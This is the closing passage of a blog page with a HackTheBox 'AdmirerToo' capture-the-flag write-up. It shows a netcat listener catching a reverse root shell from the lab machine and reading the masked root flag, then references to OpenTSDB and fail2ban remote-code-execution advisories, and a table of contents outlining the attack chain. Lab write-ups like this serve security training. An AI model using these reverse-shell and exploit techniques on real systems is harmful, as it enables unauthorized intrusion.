<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">listening on [any] 8585 ...</span><br><span class="line">10.129.96.181: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [10.10.14.67] from (UNKNOWN) [10.129.96.181] 60760</span><br><span class="line">root@admirertoo:/<span class="comment"># cat /root/root.txt</span></span><br><span class="line">261xxxxxxxxxxxxxxxxxf80</span><br></pre></td></tr></table></figure>

<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a target="_blank" rel="noopener" href="https://github.com/OpenTSDB/opentsdb/issues/2051">OpenTSDB 2.4.0 Remote Code Execution</a><br><a target="_blank" rel="noopener" href="https://research.securitum.com/fail2ban-remote-code-execution/">fail2ban – Remote Code Execution</a></p>
<hr>
<p>That’s it folks! As always do not hesitate to contact me for any questions or feedback!</p>
<p>See you next time ;)</p>
<p>-hg8</p>

  </div>
</article>
<br>
<br>


    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/CTF/">CTF</a> › <a class="category-link" href="/categories/CTF/HackTheBox/">HackTheBox</a> › <a class="category-link" href="/categories/CTF/HackTheBox/Hard-Box/">Hard Box</a>
    </div>



    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/CVE-2020-35476/" rel="tag">CVE-2020-35476</a>, <a class="tag-link-link" href="/tags/CVE-2021-21311/" rel="tag">CVE-2021-21311</a>, <a class="tag-link-link" href="/tags/CVE-2021-32749/" rel="tag">CVE-2021-32749</a>, <a class="tag-link-link" href="/tags/PHP-Object-Injection/" rel="tag">PHP Object Injection</a>, <a class="tag-link-link" href="/tags/fail2ban/" rel="tag">fail2ban</a>, <a class="tag-link-link" href="/tags/ffuf/" rel="tag">ffuf</a>, <a class="tag-link-link" href="/tags/linux/" rel="tag">linux</a>, <a class="tag-link-link" href="/tags/opencats/" rel="tag">opencats</a>, <a class="tag-link-link" href="/tags/opentsdb/" rel="tag">opentsdb</a>, <a class="tag-link-link" href="/tags/phpggc/" rel="tag">phpggc</a>, <a class="tag-link-link" href="/tags/port-forwarding/" rel="tag">port forwarding</a>, <a class="tag-link-link" href="/tags/python/" rel="tag">python</a>, <a class="tag-link-link" href="/tags/regex/" rel="tag">regex</a>, <a class="tag-link-link" href="/tags/ssrf/" rel="tag">ssrf</a>, <a class="tag-link-link" href="/tags/vhost/" rel="tag">vhost</a>, <a class="tag-link-link" href="/tags/whois/" rel="tag">whois</a>
    </div>





        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Posts</a></li>
         
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#User-flag"><span class="toc-number">1.</span> <span class="toc-text">User flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon"><span class="toc-number">1.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Adminer-database"><span class="toc-number">1.2.</span> <span class="toc-text">Adminer database</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSRF-on-Adminer"><span class="toc-number">1.3.</span> <span class="toc-text">SSRF on Adminer</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Adminer-SSRF-%E2%86%92-OpenTSBD-RCE"><span class="toc-number">1.4.</span> <span class="toc-text">Adminer SSRF → OpenTSBD RCE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Privilege-escalation-%E2%86%92-jennifer-user"><span class="toc-number">1.5.</span> <span class="toc-text">Privilege escalation → jennifer user</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#OpenCATS-database"><span class="toc-number">1.6.</span> <span class="toc-text">OpenCATS database</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jennifer-password-re-use"><span class="toc-number">1.7.</span> <span class="toc-text">jennifer password re-use</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Root-flag"><span class="toc-number">2.</span> <span class="toc-text">Root flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon-1"><span class="toc-number">2.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Into-the-Opencats-rabbit-hole"><span class="toc-number">2.2.</span> <span class="toc-text">Into the Opencats rabbit hole</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Fail2ban-Remote-Code-Execution"><span class="toc-number">2.3.</span> <span class="toc-text">Fail2ban Remote Code Execution</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Malicious-whois-server"><span class="toc-number">2.4.</span> <span class="toc-text">Malicious whois server</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#References"><span class="toc-number">3.</span> <span class="toc-text">References</span></a></li></ol>
    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2022
    <a href="https://hg8.sh">hg8.sh</a>
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Archives</a></li>
         
          <li><a href="/categories/">Category</a></li>
         
          <li><a href="/tags/">Tags</a></li>
         
          <li><a href="/atom.xml">RSS</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    
<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">


    
<script src="/lib/jquery/jquery.min.js"></script>


<script src="/js/main.js"></script>




</body>
</html>
